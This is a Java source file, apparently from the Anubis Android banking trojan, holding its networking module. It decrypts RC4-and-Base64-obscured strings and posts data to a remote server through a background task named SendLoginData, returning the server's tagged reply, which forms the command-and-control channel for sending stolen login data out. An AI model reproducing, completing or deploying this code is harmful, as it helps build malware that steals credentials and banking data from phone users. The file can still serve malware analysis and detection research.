package anubis.bot.myapplication.API;

import android.os.AsyncTask;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import anubis.bot.myapplication.UtilsClass;


public class RequestHttp{
    UtilsClass SF = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    public String go_post(String url, String parametr){
        UtilsClass SF = new UtilsClass();
        SendLoginData SendLoginData = new SendLoginData();
        SendLoginData.execute(url,parametr);
        try{
            return SF.return_plain_text(SendLoginData.get(),"<tag>","</tag>");
        }
        catch (Exception x){
            return "";
        }
    }
    public String go_post_notag(String url, String parametr){
        SendLoginData SendLoginData = new SendLoginData();
        SendLoginData.execute(url,parametr);
        try{
            return SendLoginData.get();
        }catch (Exception x){
            return "";
        }
    }

    class SendLoginData extends AsyncTask<String, String, String> {
        String resultString = null;
        @Override
        protected void onPreExecute()
        {
            super.onPreExecute();
        }
        @Override
        protected String doInBackground(String... urls)
        {
            try
            {
                String myURL = urls[0];
                String parammetrs = urls[1];
                byte[] data = null;
                InputStream is = null;
                try {
                    URL url = new URL(myURL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setDoInput(true);
                    conn.setRequestProperty("Content-Length","" + Integer.toString(parammetrs.getBytes().length));
                    OutputStream os = conn.getOutputStream();
                    data = parammetrs.getBytes("UTF-8");
                    os.write(data);
                    int lenDate=parammetrs.length();
                    data = null;
                    conn.connect();
                    int responseCode= conn.getResponseCode();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    if (responseCode == 200) {
                        is = conn.getInputStream();

                        byte[] buffer = new byte[lenDate+3000];
                        int bytesRead;
                        while ((bytesRead = is.read(buffer)) != -1) {
                            baos.write(buffer, 0, bytesRead);
                        }
                        data = baos.toByteArray();
                        resultString = new String(data, "UTF-8");
                    } else {
                    }
                    lenDate=0;
                } catch (MalformedURLException e){}catch (IOException e){}catch (Exception e){}} catch (Exception e) {e.printStackTrace();}

            return resultString;
        }
        @Override
        protected void onPostExecute(String result){super.onPostExecute(result);}
    }
}
